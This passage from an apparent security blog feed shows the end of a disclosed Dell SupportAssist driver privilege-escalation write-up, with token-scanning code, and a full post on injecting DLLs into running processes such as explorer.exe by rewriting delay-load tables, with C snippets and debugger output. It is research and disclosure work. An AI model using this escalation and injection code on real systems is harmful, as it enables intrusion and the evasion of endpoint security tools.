for(SIZE_T i = 0; i &lt; 0x10000000; i += 0x1000, uStartAddr += 0x1000){
    if (memcmp((DWORD)lpMemBuf + i, "User32 ", 8) == 0){

        if (TokenId &lt;= 0x0)
            FetchTokenId();

        if (*(DWORD*)((char*)lpMemBuf + i + 0x10) == TokenId) {
            hTokenAddr = uStartAddr;
            break;
        }
    }
}

HeapFree(GetProcessHeap(), 0, lpMemBuf);

if (hTokenAddr &gt; 0x0)
    break;
</code></pre>

<p>}
```</p>

<p>Once we identify the PA of our token, we trigger two separate writes at offset
0x40 and offset 0x48, or the Enabled and Default fields of a _TOKEN. This
sometimes requires a few runs to get right (due to mapping, which I was too
lazy to work out), but is very stable.</p>

<p>You can find the source code for the bug <a href="https://github.com/hatRiot/bugs">here</a>.</p>

<h2>Timeline</h2>

<p>04/05/18 &ndash; Vulnerability reported<br/>
04/06/18 &ndash; Initial response from Dell<br/>
04/10/18 &ndash; Status update from Dell<br/>
04/18/18 &ndash; Status update from Dell<br/>
05/16/18 &ndash; Patched version released (v2.2)</p>

<h2>References</h2>

<p>[0]
<a href="http://www.dell.com/support/contents/us/en/04/article/product-support/self-support-knowledgebase/software-and-downloads/supportassist%0A">http://www.dell.com/support/contents/us/en/04/article/product-support/self-support-knowledgebase/software-and-downloads/supportassist
</a>[1] <a href="http://blog.rewolf.pl/blog/?p=1630">http://blog.rewolf.pl/blog/?p=1630</a>
[2] <a href="https://www.exploit-db.com/exploits/39785/">https://www.exploit-db.com/exploits/39785/</a>
[3] <a href="http://www.pc-doctor.com/">http://www.pc-doctor.com/</a>
[4] <a href="https://github.com/rwfpl/rewolf-msi-exploit">https://github.com/rwfpl/rewolf-msi-exploit</a>
[5] <a href="https://github.com/hatRiot/token-priv%0A">https://github.com/hatRiot/token-priv
</a>[6]
<a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/converting-virtual-addresses-to-physical-addresses\">https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/converting-virtual-addresses-to-physical-addresses\</a></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Abusing delay load DLLs for remote code injection]]></title>
    <link href="http://hatRiot.github.io/blog/2017/09/19/abusing-delay-load-dll/"/>
    <updated>2017-09-19T14:00:00-07:00</updated>
    <id>http://hatRiot.github.io/blog/2017/09/19/abusing-delay-load-dll</id>
    <content type="html"><![CDATA[<p>I always tell myself that I&rsquo;ll try posting more frequently on my blog, and yet
here I am, two years later.  Perhaps this post will provide the necessary
motiviation to conduct more public research.  I do love it.</p>

<p>This post details a novel remote code injection technique I discovered while
playing around with delay loading DLLs.  It allows for the injection of
arbitrary code into arbitrary remote, running processes, provided that they
implement the abused functionality.  To make it abundantly clear, this is not
an exploit, it&rsquo;s simply another strategy for migrating into other processes.</p>

<p>Modern code injection techniques typically rely on a variation of two different
win32 API calls: CreateRemoteThread and NtQueueApc.  Endgame recently put out a
great article[0] detailing ten various methods of process injection.  While not
all of them allow for injection into remote processes, particularly those
already running, it does detail the most common, public variations.  This
strategy is more akin to inline hooking, though we&rsquo;re not touching the IAT
and we don&rsquo;t require our code to already be in the process.  There are no calls
to NtQueueApc or CreateRemoteThread, and no need for thread or process
suspension.  There are some limitations, as with anything, which I&rsquo;ll detail
below.</p>

<h2>Delay Load DLL</h2>

<p>Delay loading is a linker strategy that allows for the lazy loading of DLLs.
Executables commonly load all necessary dynamically linked libraries at runtime
and perform the IAT fix-ups then.  Delay loading, however, allows for
these libraries to be lazy loaded at call time, supported by a pseudo IAT
that&rsquo;s fixed-up on first call.  This process can be better illuminated by the
following, decades old figure below:</p>

<p><img src="/images/posts/2017/delay.gif"></p>

<p>This image comes from a great Microsoft article released in 1998 [1] that
describes the strategy quite well, but I&rsquo;ll attempt to distill it here.</p>

<p>Portable executables contain a data directory named
<code>IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT</code>, which you can see using <code>dumpbin /imports</code>
or using windbg.  The structure of this entry is described in delayhlp.cpp,
included with the WinSDK:</p>

<p>```
struct InternalImgDelayDescr {</p>

<pre><code>DWORD           grAttrs;        // attributes
LPCSTR          szName;         // pointer to dll name
HMODULE *       phmod;          // address of module handle
PImgThunkData   pIAT;           // address of the IAT
PCImgThunkData  pINT;           // address of the INT
PCImgThunkData  pBoundIAT;      // address of the optional bound IAT
PCImgThunkData  pUnloadIAT;     // address of optional copy of original IAT
DWORD           dwTimeStamp;    // 0 if not bound,
                                // O.W. date/time stamp of DLL bound to (Old BIND)
};
</code></pre>

<p>```</p>

<p>The table itself contains RVAs, not pointers.  We can find the delay directory
offset by parsing the file header:</p>

<p>```
0:022> lm m explorer
start    end        module name
00690000 00969000   explorer   (pdb symbols)        <br/>
0:022> !dh 00690000 -f</p>

<p>File Type: EXECUTABLE IMAGE
FILE HEADER VALUES</p>

<p>[&hellip;]</p>

<p>   68A80 [      40] address [size] of Load Configuration Directory</p>

<pre><code>   0 [       0] address [size] of Bound Import Directory
1000 [     D98] address [size] of Import Address Table Directory
</code></pre>

<p>   AC670 [     140] address [size] of Delay Import Directory</p>

<pre><code>   0 [       0] address [size] of COR20 Header Directory
   0 [       0] address [size] of Reserved Directory
</code></pre>

<p>```</p>

<p>The first entry and it&rsquo;s delay linked DLL can be seen in the following:</p>

<p><code>
0:022&gt; dd 00690000+ac670 l8
0073c670  00000001 000ac7b0 000b24d8 000b1000
0073c680  000ac8cc 00000000 00000000 00000000
0:022&gt; da 00690000+000ac7b0
0073c7b0  "WINMM.dll"
</code></p>

<p>This means that WINMM is dynamically linked to explorer.exe, but delay loaded,
and will not be loaded into the process until the imported function is invoked.
Once loaded, a helper function fixes up the psuedo IAT by using GetProcAddress
to locate the desired function and patching the table at runtime.</p>

<p>The pseudo IAT referenced is separate from the standard PE IAT; this IAT
is specifically for the delay load functions, and is referenced from the delay
descriptor.  So for example, in WINMM.dll&rsquo;s case, the pseudo IAT for WINMM is
at RVA 000b1000.  The second delay descriptor entry would have a separate RVA
for its pseudo IAT, and so on and so forth.</p>

<p>Using WINMM as our delay example, explorer imports one function from it, <code>PlaySoundW</code>.
In my particular running instance, it has not been invoked, so the pseudo IAT
has not been fixed up yet.  We can see this by dumping it&rsquo;s pseudo IAT entry:</p>

<p><code>
0:022&gt; dps 00690000+000b1000 l2
00741000  006dd0ac explorer!_imp_load__PlaySoundW
00741004  00000000
</code></p>

<p>Each DLL entry is null terminated.  The above pointer shows us that the existing
entry is merely a springboard thunk within the Explorer process.  This takes
us here:</p>

<p><code>
0:022&gt; u explorer!_imp_load__PlaySoundW
explorer!_imp_load__PlaySoundW:
006dd0ac b800107400      mov     eax,offset explorer!_imp__PlaySoundW (00741000)
006dd0b1 eb00            jmp     explorer!_tailMerge_WINMM_dll (006dd0b3)
explorer!_tailMerge_WINMM_dll:
006dd0b3 51              push    ecx
006dd0b4 52              push    edx
006dd0b5 50              push    eax
006dd0b6 6870c67300      push    offset explorer!_DELAY_IMPORT_DESCRIPTOR_WINMM_dll (0073c670)
006dd0bb e8296cfdff      call    explorer!__delayLoadHelper2 (006b3ce9)
</code></p>

<p>The tailMerge function is a linker-generated stub that&rsquo;s compiled in per-DLL,
not per function.  The <code>__delayLoadHelper2</code> function is the magic that
handles the loading and patching of the pseudo IAT.  Documented in delayhlp.cpp,
this function handles calling LoadLibrary/GetProcAddress and patching the
pseudo IAT.  As a demonstration of how this looks, I compiled a binary that
delay links dnslib.  Here&rsquo;s the process of resolution of
DnsAcquireContextHandle:</p>

<p><code>
0:000&gt; dps 00060000+0001839c l2
0007839c  000618bd DelayTest!_imp_load_DnsAcquireContextHandle_W
000783a0  00000000
0:000&gt; bp DelayTest!__delayLoadHelper2
0:000&gt; g
ModLoad: 753e0000 7542c000   C:\Windows\system32\apphelp.dll
Breakpoint 0 hit
[...]
0:000&gt; dd esp+4 l1
0024f9f4  00075ffc
0:000&gt; dd 00075ffc l4
00075ffc  00000001 00010fb0 000183c8 0001839c
0:000&gt; da 00060000+00010fb0
00070fb0  "DNSAPI.dll"
0:000&gt; pt
0:000&gt; dps 00060000+0001839c l2
0007839c  74dfd0fc DNSAPI!DnsAcquireContextHandle_W
000783a0  00000000
</code></p>

<p>Now the pseudo IAT entry has been patched up and the correct function is
invoked on subsequent calls.  This has the additional side effect of leaving
the pseudo IAT as both executable and writable:</p>

<p><code>
0:011&gt; !vprot 00060000+0001839c
BaseAddress:       00371000
AllocationBase:    00060000
AllocationProtect: 00000080  PAGE_EXECUTE_WRITECOPY
</code></p>

<p>At this point, the DLL has been loaded into the process and the pseudo IAT
patched up.  In another additional twist, not all functions are resolved on
load, only the one that is invoked.  This leaves certain entries in the
pseudo IAT in a mixed state:</p>

<p><code>
00741044  00726afa explorer!_imp_load__UnInitProcessPriv
00741048  7467f845 DUI70!InitThread
0074104c  00726b0f explorer!_imp_load__UnInitThread
00741050  74670728 DUI70!InitProcessPriv
0:022&gt; lm m DUI70
start    end        module name
74630000 746e2000   DUI70      (pdb symbols)
</code></p>

<p>In the above, two of the four functions are resolved and the DUI70.dll library
is loaded into the process.  In each entry of the delay load descriptor, the
structure referenced above maintains an RVA to the HMODULE.  If the module
isn&rsquo;t loaded, it will be null.  So when a delayed function is invoked that&rsquo;s
already loaded, the delay helper function will check it&rsquo;s entry to determine if
a handle to it can be used:</p>

<p>```
HMODULE hmod = *idd.phmod;</p>

<pre><code>if (hmod == 0) {
    if (__pfnDliNotifyHook2) {
        hmod = HMODULE(((*__pfnDliNotifyHook2)(dliNotePreLoadLibrary, &amp;dli)));
        }
    if (hmod == 0) {
        hmod = ::LoadLibraryEx(dli.szDll, NULL, 0);
        }
</code></pre>

<p>```</p>

<p>The <code>idd</code> structure is just an instance of the InternalImgDelayDescr described
above and passed into the <code>__delayLoadHelper2</code> function from the linker
tailMerge stub.  So if the module is already loaded, as referenced from delay
entry, then it uses that handle instead.  It does NOT attempt to LoadLibrary
irregardless of this value; this can be used to our advantage.</p>

<p>Another note here is that the delay loader supports notification hooks.  There
are six states we can hook into: processing start, pre load library, fail
load library, pre GetProcAddress, fail GetProcAddress, and end processing.  You
can see how the hooks are used in the above code sample.</p>

<p>Finally, in addition to delay loading, the portable executable also supports
delay library unloading.  It works pretty much how you&rsquo;d expect it, so we
won&rsquo;t be touching on it here.</p>

<h2>Limitations</h2>

<p>Before detailing how we might abuse this (though it should be fairly obvious),
it&rsquo;s important to note the limitations of this technique.  It is not completely
portable, and using pure delay load functionality it cannot be made to be so.</p>

<p>The glaring limitation is that the technique requires the remote process to be
delay linked.  A brief crawl of some local processes on my host shows many
Microsoft applications are: dwm, explorer, cmd.  Many non-Microsoft
applications are as well, including Chrome.  It is additionally a well
supported function of the portable executable, and exists today on modern
systems.</p>

<p>Another limitation is that, because at it&rsquo;s core it relies on LoadLibrary,
there must exist a DLL on disk.  There is no way to LoadLibrary from memory
(unless you use one of the countless techniques to do that, but none of which
use LoadLibrary&hellip;).</p>

<p>In addition to implementing the delay load, the remote process must implement
functionality that can be triggered.  Instead of doing a CreateRemoteThread,
SendNotifyMessage, or ResumeThread, we rely on the fetch to the pseudo IAT, and
thus we must be able to trigger the remote process into performing this
action/executing this function.  This is generally pretty easy if you&rsquo;re using
the suspended process/new process strategy, but may not be trivial on running
applications.</p>

<p>Finally, any process that does not allow unsigned libraries to be loaded will
block this technique.  This is controlled by ProcessSignaturePolicy and can be
set with SetProcessMitigationPolicy[2]; it is unclear how many apps are using
this at the moment, but Microsoft Edge was one of the first big products to be
employing this policy.  This technique is also impacted by the
ProcessImageLoadPolicy policy, which can be set to restrict loading of images
from a UNC share.</p>

<h2>Abuse</h2>

<p>When discussing an ability to inject code into a process, there are three
separate cases an attacker may consider, and some additional edge situations
within remote processes.  Local process injection is simply the execution of
shellcode/arbitrary code within the current process.  Suspended process is the
act of spawning a new, suspended process from an existing, controlled one and
injecting code into it.  This is a fairly common strategy to employ for
migrating code, setting up backup connections, or establishing a known process
state prior to injection.  The final case is the running remote process.</p>

<p>The running remote process is an interesting case with several caveats that
we&rsquo;ll explore below.  I won&rsquo;t detail suspended processes, as it&rsquo;s essentially
the same as a running process, but easier.  It&rsquo;s easier because many
applications actually just load the delay library at runtime, either because
the functionality is environmentally keyed and required then, or because
another loaded DLL is linked against it and requires it.  Refer to the source
code for the project for an implementation of suspended process injection [3].</p>

<h3>Local Process</h3>

<p>The local process is the most simple and arguably the most useless for this
strategy.  If we can inject and execute code in this manner, we might as well
link against the library we want to use.  It serves as a fine introduction to
the topic, though.</p>

<p>The first thing we need to do is delay link the executable against something.
For various reasons I originally chose <code>dnsapi.dll</code>.  You can specify delay
load DLLs via the linker options for Visual Studio.</p>

<p>With that, we need to obtain the RVA for the delay directory.  This can be
accomplished with the following function:</p>

<p>```
IMAGE_DELAYLOAD_DESCRIPTOR<em>
findDelayEntry(char </em>cDllName)
{</p>

<pre><code>PIMAGE_DOS_HEADER pImgDos = (PIMAGE_DOS_HEADER)GetModuleHandle(NULL);
PIMAGE_NT_HEADERS pImgNt = (PIMAGE_NT_HEADERS)((LPBYTE)pImgDos + pImgDos-&gt;e_lfanew);
PIMAGE_DELAYLOAD_DESCRIPTOR pImgDelay = (PIMAGE_DELAYLOAD_DESCRIPTOR)((LPBYTE)pImgDos + 
        pImgNt-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT].VirtualAddress);
DWORD dwBaseAddr = (DWORD)GetModuleHandle(NULL);
IMAGE_DELAYLOAD_DESCRIPTOR *pImgResult = NULL;

// iterate over entries 
for (IMAGE_DELAYLOAD_DESCRIPTOR* entry = pImgDelay; entry-&gt;ImportAddressTableRVA != NULL; entry++){
    char *_cDllName = (char*)(dwBaseAddr + entry-&gt;DllNameRVA);
    if (strcmp(_cDllName, cDllName) == 0){
        pImgResult = entry;
        break;
    }
}

return pImgResult;
</code></pre>

<p>}
```</p>

<p>Should be pretty clear what we&rsquo;re doing here.  Once we&rsquo;ve got the correct table
entry, we need to mark the entry&rsquo;s DllName as writable, overwrite it with our
custom DLL name, and restore the protection mask:</p>

<p><code>
IMAGE_DELAYLOAD_DESCRIPTOR *pImgDelayEntry = findDelayEntry("DNSAPI.dll");
DWORD dwEntryAddr = (DWORD)((DWORD)GetModuleHandle(NULL) + pImgDelayEntry-&gt;DllNameRVA);
VirtualProtect((LPVOID)dwEntryAddr, sizeof(DWORD), PAGE_READWRITE, &amp;dwOldProtect);
WriteProcessMemory(GetCurrentProcess(), (LPVOID)dwEntryAddr, (LPVOID)ndll, strlen(ndll), &amp;wroteBytes);
VirtualProtect((LPVOID)dwEntryAddr, sizeof(DWORD), dwOldProtect, &amp;dwOldProtect);
</code></p>

<p>Now all that&rsquo;s left to do is trigger the targeted function.  Once triggered,
the delay helper function will snag the DllName from the table entry and load
the DLL via LoadLibrary.</p>

<h3>Remote Process</h3>

<p>The most interesting of cases is the running remote process.  For demonstration
here, we&rsquo;ll be targeting explorer.exe, as we can almost always rely on it to be
running on a workstation under the current user.</p>

<p>With an open handle to the explorer process, we must perform the same
searching tasks as we did for the local process, but this time in a remote
process.  This is a little more cumbersome, but the code can be found in the
project repository for reference[3].  We simply grab the remote PEB, parse the
image and it&rsquo;s directories, and locate the appropriate delay entry we&rsquo;re
targeting.</p>

<p>This part is likely to prove the most unfriendly when attempting to port this
to another process; what functionality are we targeting?  What function or
delay load entry is generally unused, but triggerable from the current session?
With explorer there are several options; it&rsquo;s delay linked against 9 different
DLLs, each averaging 2-3 imported functions.  Thankfully one of the first
functions I looked at was pretty straightforward: <code>CM_Request_Eject_PC</code>.  This
function, exported by <code>CFGMGR32.dll</code>, requests that the system be ejected from
the local docking station[4].  We can therefore assume that it&rsquo;s likely to be
available and not fixed on workstations, and potentially unfixed on laptops,
should the user never explicitly request the system to be ejected.</p>

<p>When we request for the workstation to be ejected from the docking station, the
function sends a PNP request.  We use the IShellDispatch object to execute
this, which is accessed via Shell, handled by, you guessed it, explorer.</p>

<p>The code for this is pretty simple:</p>

<p>```
HRESULT hResult = S_FALSE;
IShellDispatch *pIShellDispatch = NULL;</p>

<p>CoInitialize(NULL);</p>

<p>hResult = CoCreateInstance(CLSID_Shell, NULL, CLSCTX_INPROC_SERVER,</p>

<pre><code>                       IID_IShellDispatch, (void**)&amp;pIShellDispatch);
</code></pre>

<p>if (SUCCEEDED(hResult))
{</p>

<pre><code>pIShellDispatch-&gt;EjectPC();
pIShellDispatch-&gt;Release();
</code></pre>

<p>}</p>

<p>CoUninitialize();
```</p>

<p>Our DLL only needs to export <code>CM_Request_Eject_PC</code> for us to not crash the
process; we can either pass on the request to the real DLL, or simply ignore
it.  This leads us to stable and reliable remote code injection.</p>

<h3>Remote Process &ndash; All Fixed</h3>

<p>One interesting edge case is a remote process that you want to inject into via
delay loading, but all imported functions have been resolved in the pseudo IAT.
This is a little more complicated, but all hope is not lost.</p>

<p>Remember when I mentioned earlier that a handle to the delay load library is
maintained in its descriptor?  This is the value that the helper function
checks for to determine if it should reload the module or not; if it&rsquo;s null, it
attempts to load it, if it&rsquo;s not, it uses that handle.  We can abuse this check
by nulling out the module handle, thereby &ldquo;tricking&rdquo; the helper function into
once again loading that descriptor&rsquo;s DLL.</p>

<p>In the discussed case, however, the pseudo IAT is all patched up; no more
trampolines into the delay load helper function.  Helpfully the pseudo IAT is
writable by default, so we can simply patch in the trampoline function
ourselves and have it instantiate the descriptor all over again.  In short,
this worst-case strategy requires three separate WriteProcessMemory calls: one
to null out the module handle, one to overwrite the pseudo IAT entry, and one
to overwrite the loaded DLL name.</p>

<h3>Conclusions</h3>

<p>I should make mention that I tested this strategy across several next gen
AV/HIPS appliances, which will go unnamed here, and none where able to detect
the cross process injection strategy.  It would seem overall to be an
interesting challenge at detection; in remote processes, the strategy uses the
following chain of calls:</p>

<p>```
OpenProcess(..);</p>

<p>ReadRemoteProcess(..); // read image
ReadRemoteProcess(..); // read delay table
ReadRemoteProcess(..); // read delay entry 1&hellip;n</p>

<p>VirtualProtectEx(..);
WriteRemoteProcess(..);
```</p>

<p>That&rsquo;s it.  The trigger functionality would be dynamic among each process, and
the loaded library would be loaded via supported and well-known Windows
facilities.  I checked out a few other core Windows applications, and they all
have pretty straightforward trigger strategies.</p>

<p>The referenced project[3] includes both x86 and x64 support, and has been
tested across Windows 7, 8.1, and 10.  It includes three functions of interest:
inject_local, inject_suspended, and inject_explorer.  It expects to find
the DLL at <code>C:\Windows\Temp\TestDLL.dll</code>, but this can obviously be changed.
Note that it isn&rsquo;t production quality; beware, here be dragons.</p>

<p><em>Special thanks to Stephen Breen for reviewing this post</em></p>

<h2>References</h2>

<p>[0]
<a href="https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process">https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process</a> <br/>
[1] <a href="https://www.microsoft.com/msj/1298/hood/hood1298.aspx">https://www.microsoft.com/msj/1298/hood/hood1298.aspx</a> <br/>
[2]
<a href="https://msdn.microsoft.com/en-us/library/windows/desktop/hh769088">https://msdn.microsoft.com/en-us/library/windows/desktop/hh769088</a>(v=vs.85).aspx <br/>
[3] <a href="https://github.com/hatRiot/DelayLoadInject">https://github.com/hatRiot/DelayLoadInject</a>  <br/>
[4]
<a href="https://msdn.microsoft.com/en-us/library/windows/hardware/ff539811">https://msdn.microsoft.com/en-us/library/windows/hardware/ff539811</a>(v=vs.85).aspx</p>
]]></content>
  </entry>
  
</feed>
